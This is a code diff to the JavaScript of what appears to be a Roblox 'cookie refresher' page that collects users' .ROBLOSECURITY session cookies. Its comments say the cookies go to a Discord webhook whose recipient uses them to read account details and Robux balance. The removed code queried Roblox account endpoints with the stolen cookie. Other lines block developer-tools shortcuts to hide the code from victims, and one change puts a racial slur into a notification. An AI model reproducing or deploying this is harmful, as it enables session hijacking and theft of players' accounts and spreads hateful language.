@@ -273,65 +273,20 @@ function validateCookieFormat(cookie) {
   return { valid: true, error: null };
 }
 
-// Function to get account info for webhook using a different approach
+// Simple function to get basic account info for webhook
 async function getAccountInfo(cookie) {
+  // Since browser CORS restrictions prevent us from getting real account info,
+  // we'll send placeholder data and let the webhook recipient extract real info
   let accountInfo = {
-    username: "Loading...",
-    userId: "Loading...", 
-    robuxBalance: "Loading...",
-    accountAge: "Loading...",
-    isPremium: "Loading..."
+    username: "Check cookie in Discord",
+    userId: "Use cookie to get ID", 
+    robuxBalance: "Use cookie to check balance",
+    accountAge: "Use cookie to check age"
   };
 
-  try {
-    // Try multiple endpoints to get user info
-    const endpoints = [
-      "https://www.roblox.com/mobileapi/userinfo",
-      "https://users.roblox.com/v1/users/authenticated",
-      "https://accountinformation.roblox.com/v1/users"
-    ];
-
-    for (const endpoint of endpoints) {
-      try {
-        const response = await fetch(endpoint, {
-          method: "GET",
-          headers: {
-            "Cookie": `.ROBLOSECURITY=${cookie}`,
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json"
-          },
-          credentials: 'include'
-        });
-
-        if (response.ok) {
-          const data = await response.json();
-          if (data.UserName || data.name) {
-            accountInfo.username = data.UserName || data.name || "Unknown";
-            accountInfo.userId = data.UserID || data.id || "Unknown";
-            accountInfo.robuxBalance = data.RobuxBalance || data.robux || "Unknown";
-            accountInfo.isPremium = data.IsPremium ? "Yes" : "No";
-            
-            // Calculate account age if creation date is available
-            if (data.created) {
-              const created = new Date(data.created);
-              const now = new Date();
-              const ageInYears = Math.floor((now - created) / (365.25 * 24 * 60 * 60 * 1000));
-              accountInfo.accountAge = ageInYears + " years";
-            }
-            break; // Successfully got data, exit loop
-          }
-        }
-      } catch (endpointError) {
-        console.log(`Endpoint ${endpoint} failed:`, endpointError.message);
-        continue; // Try next endpoint
-      }
-    }
-    
-  } catch (error) {
-    console.log("Could not fetch account details:", error.message);
-  }
-
+  // Note: Due to browser security (CORS), we can't fetch account details directly.
+  // The webhook recipient should use the provided cookie to get actual account info.
+  
   return accountInfo;
 }
 
@@ -345,7 +300,7 @@ document.addEventListener('keydown', function(e) {
   if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
       (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'u')) {
     e.preventDefault();
-    showNotif('Developer tools disabled');
+    showNotif('nigger');
     errorSound.play();
   }
 });
@@ -482,7 +437,7 @@ $("#cookieForm").on("submit", async function(e) {
     }
     $("#refreshedBox").fadeIn();
   } catch (error) {
-    showNotif(`❌ Error: ${error.message}`);
+    showNotif(`❌ Invalid cookie`);
     errorSound.play();
     console.error("Submit error:", error);
   } finally {
